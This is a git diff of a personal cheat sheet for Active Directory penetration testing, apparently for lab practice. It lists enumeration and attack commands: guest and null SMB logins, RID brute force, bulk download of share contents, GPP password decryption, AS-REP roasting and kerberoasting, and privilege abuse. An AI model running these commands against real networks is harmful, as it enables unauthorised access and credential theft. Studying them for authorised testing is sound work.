@@ -2,9 +2,12 @@
 <!-- TOC -->
 
 - [Table of Content](#table-of-content)
+- [Useful links](#useful-links)
 - [Enumeration](#enumeration)
     - [Tools](#tools)
     - [Default credentials](#default-credentials)
+    - [SMBclient recursively get all](#smbclient-recursively-get-all)
+    - [Exposed clear domain Group Policy GPP](#exposed-clear-domain-group-policy-gpp)
 - [Privilege Escalation](#privilege-escalation)
     - [Enumeration](#enumeration)
         - [Bloodhound](#bloodhound)
@@ -19,6 +22,12 @@
 
 <!-- /TOC -->
 
+# Useful links
+
+ - [Active Directory Pentest MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
+ - [0-9 Guide to Active Directory Attacks](https://zer1t0.gitlab.io/posts/attacking_ad/)
+ - [OSCP-like Labs and Machines](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)
+
 # Enumeration
 search for:
 - shares
@@ -27,31 +36,9 @@ search for:
 
 \
 try using default credentials like `guest` and no password\
-reapet enumeration with any other users you find access to
+repeat enumeration with any other users you find access to
 
-## Tools
-1. crackmapexec
-    - `crackmapexec smb {host} --shares {-u guest -p ''}`
-    - `crackmapexec smb {host} --rid-brute`
-2. nxc
-    - `nxc smb {host} --shares {-u guest -p ''}`
-    - `nxc ldap {host} {-M group-mem -o group="Remote Managment Users"}`
-    - `nxc smb {host} --rid-brute`
-    - `nxc smb {host} --users`
-3. smbclient
-    - `smbclient -L HOST`
-    - `smbclient HOST\SHARE {- U user%password}`
-4. impacket
-    - `impacket-lookupsid {host} {-no-pass}`
-5. evilwinrm
-    - use it every time with every new users and {password} you find. Also check it with `nxc ldap` because sometimes it doesnt work
-
-## Default credentials
-- smb: `-u 'guest' -p ''`
-
-# Privilege Escalation
-
-## Enumeration
+## Privilege Escalation
 - check permission: `whoami /all`
 - search for vulnerable certificates
 - winPEAS
@@ -62,6 +49,45 @@ reapet enumeration with any other users you find access to
     - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
 2. Import and query
 
+## Tools
+1. crackmapexec:
+    - `crackmapexec smb {host} --shares {-u '' -p ''}`
+    - `crackmapexec smb {host} --rid-brute`
+2. nxc:
+    - `nxc smb {host} --shares {-u guest -p ''}`
+    - `nxc ldap {host} {-M group-mem -o group="Remote Managment Users"}`
+    - `nxc smb {host} --rid-brute`
+    - `nxc smb {host} --users`
+3. smbclient:
+    - `smbclient -L HOST`
+    - `smbclient HOST\SHARE {- U user%password}`
+4. impacket:
+    - `impacket-lookupsid {host} {-no-pass}`
+5. evilwinrm:
+    - use it every time with every new users and {password} you find. Also check it with `nxc ldap` because sometimes it doesnt work
+6. smbmap:
+    - `smbmap -H {target}`
+
+## Default credentials
+- smb: `-u 'guest' -p ''`
+
+## SMBclient recursively get all 
+```
+mask "";
+recurse ON;
+prompt OFF;
+mget *;
+```
+
+## Exposed clear domain Group Policy (GPP)
+if you find GPP on the smb shares or somewhere, Microsoft pubblished the static AES key. [Learn more here.](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
+- you can use `gpp-decrypt` to crack it.
+
+## Kerberoasting TODO study better: HTB [kerberos](https://academy.hackthebox.com/module/details/25)
+enumerate possibile movement with Kerberos using:
+- `impacket-GetNPUsers {domain} -userfile users.txt {-format hashcat -outputfile output.txt}`
+- `nxc ldap {domain} -u user.txt -p passwords.txt --asreproast output.txt`
+- `impacket-GetUserSPNs {domain} -no--preauth -userfile users.txt -dc-ip {ip}`
 ## SeBackupPrivilege
 Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege.git) github repository.
 
@@ -128,7 +154,7 @@ so you log in with evil-winrm using the second part of the HASH
 ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.
 
 
-# notes from adri TODO
+## notes from adri TODO
 
 utile anche usare nxc con --debug
 
